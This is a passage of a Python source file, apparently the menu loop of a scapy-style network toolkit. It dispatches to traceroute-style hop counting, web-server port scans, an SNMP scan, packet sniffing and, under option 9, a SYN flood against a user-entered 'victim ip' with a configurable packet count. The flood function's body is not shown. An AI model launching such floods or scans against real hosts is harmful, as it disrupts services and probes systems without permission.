        # The statement below checks if the url entered is correct
        try:
            socket.gethostbyname(host)
            alternative_number_of_hops(host)
        except socket.gaierror:
            print("\n\nPlease enter a correct URL!!!\n")
            continue

        print(
            "\nNOTE: Where the SA and repetition of an ip address starts\n"
            "The corresponding number on the left is the hop count")

    elif choice == '7':
        print("\n\n1) Enter your own URL")
        print("2) Let the program pick 10 random websites out of 60 preset websites\n")
        web_scan_choice = input("Your choice: \n")

        # Depending on the result of the web_scan_choice input the process will either be a 10 random website scan or
        # one custom website scan
        if web_scan_choice == '1':
            t1 = datetime.now()
            ip_proto_port_scan_for_web_server(False)
            t2 = datetime.now()
            print("\nAll done in " + str(t2 - t1) + "\n\n")
        else:
            t1 = datetime.now()
            ip_proto_port_scan_for_web_server(True)
            t2 = datetime.now()
            print("\nAll done in " + str(t2 - t1) + "\n\n")

    elif choice == '8':
        t1 = datetime.now()
        # snmp_scan initiated
        snmp_scan()
        t2 = datetime.now()
        print("\nAll done in " + str(t2 - t1) + "\n")

    elif choice == '9':
        victim_ip = input("\nPlease enter the victim ip (Ex: 192.168.1.87):\n")

        # The statement below checks if the victim ip is a legit ip
        try:
            socket.inet_aton(victim_ip)
        except socket.error:
            print("\n\nPlease enter a correct ip!!!\n")
            continue
        proto_type = input("Please enter the transportation protocol (Ex: tcp or udp or both):\n")

        for_tcp = False
        for_udp = False
        for_tcp_and_udp = False

        # This is to decide whether the attack will be tcp or udp attack or both
        if proto_type.lower() == "tcp":
            for_tcp = True

        elif proto_type.lower() == "udp":
            for_udp = True

        elif proto_type.lower() == "both":
            for_tcp_and_udp = True

        else:
            print("\n\nPlease enter a correct transportation protocol!!!\n")
            continue

        port_range = input("Please enter a port (Ex: 80) or a port range (Ex: 20-80):\n")

        start_port = ''
        end_port = ''
        minus_check = False

        # This if statement checks whether the port or the port range entered is correct
        if len(port_range) > 0:
            for i in port_range:
                if i == "-":
                    minus_check = True
                    continue
                if not minus_check:
                    start_port += i
                if minus_check:
                    end_port += i

            if len(end_port) < 1:
                end_port = start_port

            try:
                if int(end_port) < int(start_port):
                    temp = start_port
                    start_port = end_port
                    end_port = temp
            except ValueError:
                print("\n\nPlease Try Again With Correct Values!!!\n")
                continue
        else:
            print("\n\nPlease Try Again With Correct Values!!!\n")
            continue

        how_many = input("Please enter how many thousand syn packets you want to send (Ex: 1 -> 1000):\n")

        # This statement checks if the input for how_many is a positive number
        try:
            if int(how_many) > 0:

                # Random ips are appended here
                random_ips = []
                for i in range(1, 256):
                    random_ips.append('192.168.1.' + str(i))

                t1 = datetime.now()
                syn_flood_attack(victim_ip, how_many)
                t2 = datetime.now()
                print("SYN Flood Attack took " + str(t2 - t1) + "\n")
            else:
                print("\n\nPlease enter a positive integer for how many question!!!\n")
                continue
        except ValueError:
            print("\n\nPlease enter a positive integer for how many question!!!\n")
            continue

    elif choice == '10':
        # packet_sniff initiated
        packet_sniff()

    elif choice == '11':
        # show initiated
        show()

    else:
        print("\n\nPlease enter an existing choice (Ex: 1,2,3,...,11)!!!\n")
        continue
